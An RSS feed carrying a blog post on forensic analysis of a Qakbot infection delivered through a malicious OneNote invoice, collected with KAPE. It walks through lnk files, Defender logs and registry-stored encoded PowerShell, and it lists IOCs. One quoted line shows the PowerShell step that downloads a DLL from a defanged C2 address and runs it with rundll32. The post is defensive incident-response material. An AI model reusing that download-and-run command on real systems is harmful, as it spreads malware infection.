<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Forensic Analysis - malwr0nwind0z</title>
	<atom:link href="/blog/category/forensic-analysis/feed/" rel="self" type="application/rss+xml" />
	<link>/blog/</link>
	<description></description>
	<lastBuildDate>Sun, 12 Mar 2023 18:44:50 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.1.1</generator>
	<item>
		<title>KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</title>
		<link>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/</link>
					<comments>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/#respond</comments>
		
		<dc:creator><![CDATA[malwr0nwind0z]]></dc:creator>
		<pubDate>Sun, 12 Mar 2023 18:24:42 +0000</pubDate>
				<category><![CDATA[Forensic Analysis]]></category>
		<category><![CDATA[banking trojan]]></category>
		<category><![CDATA[dead-box forensics]]></category>
		<category><![CDATA[forensics]]></category>
		<category><![CDATA[kape]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[onenote]]></category>
		<category><![CDATA[qakbot]]></category>
		<category><![CDATA[qaknote]]></category>
		<guid isPermaLink="false">/blog/?p=1029</guid>

					<description><![CDATA[<p>KAPE: Kroll Artifact Parser and Extractor KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and &#8230;</p>
<p class="read-more"> <a class="" href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/"> <span class="screen-reader-text">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</span> Read More &#187;</a></p>
<p>The post <a href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
										<content:encoded><![CDATA[<div data-elementor-type="wp-post" data-elementor-id="1029" class="elementor elementor-1029">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-b52702 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="b52702" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-6bb95191" data-id="6bb95191" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-27ba60b3 elementor-widget elementor-widget-text-editor" data-id="27ba60b3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.11.4 - 12-03-2023 */
.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#818a91;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#818a91;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}</style>				<p><img decoding="async" width="545" height="297" class="wp-image-1030" src="/blog/wp-content/uploads/2023/03/icon-description-automatically-generated.png" alt="Icon Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/icon-description-automatically-generated.png 545w, /blog/wp-content/uploads/2023/03/icon-description-automatically-generated-300x163.png 300w" sizes="(max-width: 545px) 100vw, 545px" /></p><p>KAPE: <strong>K</strong>roll <strong>A</strong>rtifact <strong>P</strong>arser and <strong>E</strong>xtractor</p><p>KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and triage forensic artifacts.</p><p>How KAPE Works</p><p>KAPE utilizes Targets and Modules to collect and triage forensic artifacts. The concepts of Targets and Modules allow this tool to do its work:</p><p>Targets: the type of artifacts (files, logs, or registry hives) that you can collect and store in a container (i.e. vhdx, zip).</p><p>Modules: scripts that utilize third-party programs/parsers to process and export (i.e. .csv, zip) the artifacts.</p><p>Below, we run KAPE to collect forensic artifacts on a Windows 10 machine suspected of being infected with Qakbot. The KAPE collection is being saved to an external HDD (D:).</p><p><img decoding="async" width="1088" height="125" class="wp-image-1031" src="/blog/wp-content/uploads/2023/03/word-image-1029-2.png" srcset="/blog/wp-content/uploads/2023/03/word-image-1029-2.png 1088w, /blog/wp-content/uploads/2023/03/word-image-1029-2-300x34.png 300w, /blog/wp-content/uploads/2023/03/word-image-1029-2-1024x118.png 1024w, /blog/wp-content/uploads/2023/03/word-image-1029-2-768x88.png 768w" sizes="(max-width: 1088px) 100vw, 1088px" /><strong>Figure 1: KAPE ran from an external drive.</strong></p><p><img decoding="async" width="702" height="245" class="wp-image-1032" src="/blog/wp-content/uploads/2023/03/text-description-automatically-generated.png" alt="Text Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/text-description-automatically-generated.png 702w, /blog/wp-content/uploads/2023/03/text-description-automatically-generated-300x105.png 300w" sizes="(max-width: 702px) 100vw, 702px" /><strong>Figure 2: KAPE collection is done.</strong></p><p>The target forensic artifacts (files, logs, or registry hives) that I collect are stored in a vhdx container where I can later mount and analyze.</p><p><img decoding="async" width="800" height="108" class="wp-image-1033" src="/blog/wp-content/uploads/2023/03/word-image-1029-4.jpeg" srcset="/blog/wp-content/uploads/2023/03/word-image-1029-4.jpeg 800w, /blog/wp-content/uploads/2023/03/word-image-1029-4-300x41.jpeg 300w, /blog/wp-content/uploads/2023/03/word-image-1029-4-768x104.jpeg 768w" sizes="(max-width: 800px) 100vw, 800px" /><strong>Figure 3: Target forensic artifacts stored in a xhdx file.</strong></p><p><img decoding="async" width="1177" height="362" class="wp-image-1034" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email.jpeg" alt="Graphical user interface, text, application, email Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email.jpeg 1177w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email-300x92.jpeg 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email-1024x315.jpeg 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email-768x236.jpeg 768w" sizes="(max-width: 1177px) 100vw, 1177px" /><strong>Figure 4: The xhdx file is mounted for analysis.</strong></p><p><img decoding="async" width="1431" height="482" class="wp-image-1035" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce.jpeg" alt="Graphical user interface, application, table, Excel Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce.jpeg 1431w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce-300x101.jpeg 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce-1024x345.jpeg 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce-768x259.jpeg 768w" sizes="(max-width: 1431px) 100vw, 1431px" /><strong>Figure 5: The CopyLog of all of the files that were collected in the xhdx file.</strong></p><p>Qakbot: A Banking Trojan</p><p>Qakbot is a malicious Banking Trojan that has been actively used in cyberattacks since 2009. This malware is designed to compromise the security of a target system and allow remote attackers to gain unauthorized access and control. Once it infects a computer, it then steals sensitive information such as banking credentials, personal information, and email passwords.</p><p>How This Qakbot Infection Started</p><p>Qakbot is typically delivered to the victim through various methods, including phishing emails, malspam, exploit kits, and exploiting vulnerabilities in software. The exact method of delivery may vary depending on the attackers&#8217; goals.</p><p>In this instance, our digital forensic artifacts confirm that it was delivered through malspam; that contained a malicious Microsoft OneNote document (Qaknote) within a zip archive named Invoice #030223.zip. The malicious OneNote document (Invoice #030223.one) contained a social engineering Microsoft O365 themed image (double click “open”), that once clicked, it executes an embedded WScript file (O P E N .wsf).</p><p><img decoding="async" width="1278" height="475" class="wp-image-1036" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description.png" alt="Graphical user interface, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description.png 1278w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-300x112.png 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1024x381.png 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-768x285.png 768w" sizes="(max-width: 1278px) 100vw, 1278px" /> <strong>Figure 6: Embedded social engineering Microsoft O365 themed image (double click “open”)in the OneNote document (Invoice #030223.one).</strong></p><p>Qakbot &#8211; Forensic Artifacts</p><p>The review of the user’s Recent folder shows a lnk file for O P E N .wsf, indicating that it was double clicked and executed. Microsoft Protection (MPLog) was able to log the execution of this WScript file (O P E N .wsf) as having PID:7636 and the process start time: 133225496244686642 (LDAP/FILETIME) which converts to Sunday, March 5, 2023 11:13:44 PM GMT-05:00.</p><p><img decoding="async" width="1007" height="103" class="wp-image-1037" src="/blog/wp-content/uploads/2023/03/word-image-1029-8.jpeg" srcset="/blog/wp-content/uploads/2023/03/word-image-1029-8.jpeg 1007w, /blog/wp-content/uploads/2023/03/word-image-1029-8-300x31.jpeg 300w, /blog/wp-content/uploads/2023/03/word-image-1029-8-768x79.jpeg 768w" sizes="(max-width: 1007px) 100vw, 1007px" /><strong>Figure 7: Lnk file (located in Recent folder) pointing to the WScript file (O P E N .wsf) that the user executed.</strong></p><p><img decoding="async" width="440" height="18" class="wp-image-1038" src="/blog/wp-content/uploads/2023/03/word-image-1029-9.jpeg" srcset="/blog/wp-content/uploads/2023/03/word-image-1029-9.jpeg 440w, /blog/wp-content/uploads/2023/03/word-image-1029-9-300x12.jpeg 300w" sizes="(max-width: 440px) 100vw, 440px" /></p><p><strong>Figure 8: Microsoft Protection logging the PID and execution time of the WScript file (O P E N .wsf).</strong></p><p>.</p><p>The WScript file invokes PowerShell to download a malicious Qakbot .dll from the following URL:</p><p>Download URL: http://143.198.63[.]241/MCv/020 -O $env:TEMP\; rundll32 $env:TEMP\\dysphemistic.dll,RS32;</p><p>Drop folder location: C:\Users\&lt;Username&gt;\AppData\Local\Temp\dysphemistic.dll (Classification: Qakbot .dll)</p><p>This PowerShell activity was decoded and logged in the Microsoft-Windows-PowerShell%4Operational Event logs (Note: this logging is disabled by default).</p><p><img decoding="async" width="1065" height="924" class="wp-image-1039" src="/blog/wp-content/uploads/2023/03/table-description-automatically-generated.jpeg" alt="Table Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/table-description-automatically-generated.jpeg 1065w, /blog/wp-content/uploads/2023/03/table-description-automatically-generated-300x260.jpeg 300w, /blog/wp-content/uploads/2023/03/table-description-automatically-generated-1024x888.jpeg 1024w, /blog/wp-content/uploads/2023/03/table-description-automatically-generated-768x666.jpeg 768w" sizes="(max-width: 1065px) 100vw, 1065px" /><strong>Figure 9: PowerShell Event log showing the download of dysphemistic.dll.</strong></p><p>Microsoft Protection (MPLog) Telemetry was able to log the execution of dysphemistic.dll.</p><p><img decoding="async" width="1917" height="541" class="wp-image-1040" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr.jpeg" alt="Graphical user interface, text, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr.jpeg 1917w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-300x85.jpeg 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-1024x289.jpeg 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-768x217.jpeg 768w, /blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr-1536x433.jpeg 1536w" sizes="(max-width: 1917px) 100vw, 1917px" /><strong>Figure 10: Microsoft Protection logging the execution of dysphemistic.dll.</strong></p><p>Last but not least, we had to perform some Registry Forensics, due to having encoded PowerShell stores in HKCU\SOFTWARE\ subkeys ‘Meteors’ &amp; ‘disprofitablePlanographically’.</p><p><img decoding="async" width="1920" height="412" class="wp-image-1041" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1.png" alt="Graphical user interface, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1.png 1920w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-300x64.png 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-1024x220.png 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-768x165.png 768w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1-1536x330.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /><strong>Figure 11: Encoded PowerShell stored in HKCU\SOFTWARE\Meteors.</strong></p><p><img decoding="async" width="1920" height="315" class="wp-image-1042" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2.png" alt="Graphical user interface, application Description automatically generated" srcset="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2.png 1920w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-300x49.png 300w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-1024x168.png 1024w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-768x126.png 768w, /blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2-1536x252.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /></p><p><strong>Figure 12: Encoded PowerShell stored in HKCU\SOFTWARE\<a id="post-1029-_Hlk129460078"></a>disprofitablePlanographically.</strong></p><p>That ends this blog, where we used KAPE to collect and analyzed forensic artifacts from stage 1 of this Qakbot infection.</p><p>IOCs:</p><p>Invoice #030223.zip (MD5: abc43976c90a3bfef20f08f3632e7c22)</p><p>Invoice #030223.one (MD5: 5E0085D44B2CD845CC8A964DAB23027A)</p><p>O P E N .wsf (MD5: 56E1C721F50A8AAE1FBAF1459A1208E2)</p><p>dysphemistic.dll (MD5: 0AB80C49FDEA4229C022F43F5357E64B)</p><p>C2 IOC:</p><p>http://143.198.63[.]241/MCv/020</p><p> </p>						</div>
				</div>
					</div>
		</div>
							</div>
		</section>
							</div><p>The post <a href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></content:encoded>
					
					<wfw:commentRss>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
